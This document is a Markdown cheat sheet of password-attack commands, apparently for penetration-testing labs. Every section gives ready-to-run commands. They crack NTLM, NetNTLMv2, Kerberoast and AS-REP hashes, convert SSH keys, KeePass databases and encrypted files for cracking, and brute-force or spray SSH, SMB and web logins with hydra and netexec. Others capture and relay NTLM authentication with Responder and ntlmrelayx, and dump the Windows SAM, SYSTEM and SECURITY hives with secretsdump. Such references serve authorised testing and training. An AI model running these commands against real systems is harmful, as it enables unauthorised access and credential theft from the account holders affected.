## Passwords

### Identify

```bash
# Identify likely hash formats.
hashid hashes.txt
# Identify hashes with Name-That-Hash.
nth --file hashes.txt
# Browse Hashcat modes and examples.
hashcat --example-hashes | less
```

### Convert

```bash
# Convert an SSH key for John.
ssh2john id_rsa > ssh.hash
# Convert a KeePass database for John.
keepass2john Database.kdbx > keepass.hash
# Convert a ZIP archive for John.
zip2john backup.zip > zip.hash
# Convert a PDF document for John.
pdf2john report.pdf > pdf.hash
# Convert an Office document for John.
office2john payroll.xlsx > office.hash
# Extract BitLocker hashes.
bitlocker2john -i disk.img > bitlocker.hash
# Combine passwd and shadow entries.
unshadow passwd shadow > linux.hash
```

### Crack

```bash
# Crack MD5 with a wordlist and rule.
hashcat -m 0 md5.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# Crack NTLM hashes.
hashcat -m 1000 ntlm.hash /usr/share/wordlists/rockyou.txt
# Crack NetNTLMv2 challenge responses.
hashcat -m 5600 netntlmv2.hash /usr/share/wordlists/rockyou.txt
# Crack AS-REP hashes.
hashcat -m 18200 asrep.hash /usr/share/wordlists/rockyou.txt
# Crack Kerberoast TGS hashes.
hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt
# Crack a KeePass database hash.
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
# Display recovered NTLM passwords.
hashcat -m 1000 ntlm.hash --show
# Crack the ZIP password with John.
john --wordlist=/usr/share/wordlists/rockyou.txt zip.hash
# Display the recovered ZIP password.
john --show zip.hash
```

### Candidates

```bash
# Build words from the target website.
cewl -d 2 -m 5 -w cewl.txt "$URL"
# Mutate the collected words with Best64 rules.
hashcat --stdout cewl.txt -r /usr/share/hashcat/rules/best64.rule > candidates.txt
# Remove duplicate candidates.
sort -u candidates.txt -o candidates.txt
```

### Online

```bash
# Test SSH with the targeted password list.
hydra -l george -P candidates.txt -f -V "ssh://$IP" -o ssh-hydra.txt
# Test one SMB password against known users.
hydra -L users.txt -p 'Nexus123!' -f -V "smb://$IP" -o smb-hydra.txt
# Test the HTTP login form.
hydra -l pete -P candidates.txt "$IP" http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid credentials' -o http-hydra.txt
# Spray one password across SMB users.
netexec smb "$IP" -u users.txt -p 'Nexus123!' -d "$DOMAIN" --continue-on-success | tee spray.txt
```

### Responder

```bash
# Capture network authentication attempts on tun0.
sudo responder -I tun0 -v | tee responder.txt
# Relay captured NTLM authentication to SMB.
impacket-ntlmrelayx --no-http-server -smb2support -t "$IP" -c 'whoami'
```

### Windows hives

```cmd
REM Save the SAM registry hive.
reg save HKLM\SAM C:\Windows\Temp\sam
REM Save the SYSTEM registry hive.
reg save HKLM\SYSTEM C:\Windows\Temp\system
REM Save the SECURITY registry hive.
reg save HKLM\SECURITY C:\Windows\Temp\security
```

```bash
# Extract secrets from the copied registry hives.
impacket-secretsdump -sam sam -system system -security security LOCAL | tee secrets.txt
```
